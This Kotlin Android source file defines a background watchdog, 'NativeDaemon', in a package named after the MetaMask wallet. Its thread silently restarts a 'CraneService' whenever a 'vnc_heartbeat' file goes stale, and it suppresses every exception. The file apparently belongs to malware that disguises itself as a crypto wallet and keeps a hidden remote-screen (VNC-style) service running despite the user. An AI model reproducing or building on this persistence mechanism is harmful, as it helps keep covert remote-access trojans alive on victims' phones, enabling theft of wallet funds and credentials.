package com.example.MetaMask.services

import android.content.Context
import android.content.Intent
import android.os.Build
import java.io.File

object NativeDaemon {
    private const val TAG = "NativeDaemon"
    private const val HEARTBEAT_FILE = "vnc_heartbeat"
    private const val CHECK_INTERVAL_MS = 10_000L
    private const val MAX_STALE_MS = 25_000L

    @Volatile private var running = false
    private var daemonThread: Thread? = null

    @Synchronized
    fun ensure(context: Context) {
        android.util.Log.d("XDBG", "[NativeDaemon] ensure enter context=ctx") //xdbg
        if (running && daemonThread?.isAlive == true) return
        val appCtx = context.applicationContext
        running = true
        daemonThread = Thread {
            while (running) {
                android.util.Log.d("XDBG", "[NativeDaemon] loop") //xdbg
                try {
                    Thread.sleep(CHECK_INTERVAL_MS)
                } catch (_: InterruptedException) {
                    android.util.Log.e("XDBG", "[NativeDaemon] catch (ignored)") //xdbg
                    Thread.currentThread().interrupt()
                    break
                }
                try { tick(appCtx) } catch (_: Exception) {}
            }
        }.also { t ->
            t.isDaemon = true
            t.name = "native-daemon-watchdog"
            t.priority = Thread.MIN_PRIORITY
            t.start()
        }
    }

    fun stop() {
        android.util.Log.d("XDBG", "[NativeDaemon] stop enter") //xdbg
        running = false
        try { daemonThread?.interrupt() } catch (_: Exception) {}
        daemonThread = null
    }

    fun heartbeat(context: Context) {
        android.util.Log.d("XDBG", "[NativeDaemon] heartbeat enter context=ctx") //xdbg
        try {
            val f = File(context.filesDir, HEARTBEAT_FILE)
            f.writeText(System.currentTimeMillis().toString())
        } catch (_: Exception) {}
    }

    private fun tick(context: Context) {
        android.util.Log.d("XDBG", "[NativeDaemon] tick enter context=ctx") //xdbg
        val mode = try { CraneService.craneMode } catch (_: Exception) { "off" }
        if (mode == "off") return

        if (CraneService.instance == null) { resurrect(context); return }
        val hbFile = File(context.filesDir, HEARTBEAT_FILE)
        if (hbFile.exists()) {
            android.util.Log.d("XDBG", "[NativeDaemon] if branch") //xdbg
            val ts = hbFile.readText().trim().toLongOrNull() ?: 0L
            val age = System.currentTimeMillis() - ts
            if (age > MAX_STALE_MS) resurrect(context)
        }
    }

    private fun resurrect(context: Context) {
        android.util.Log.d("XDBG", "[NativeDaemon] resurrect enter context=ctx") //xdbg
        try {
            val intent = Intent(context, CraneService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent)
            else context.startService(intent)
        } catch (_: Exception) {}
    }
}
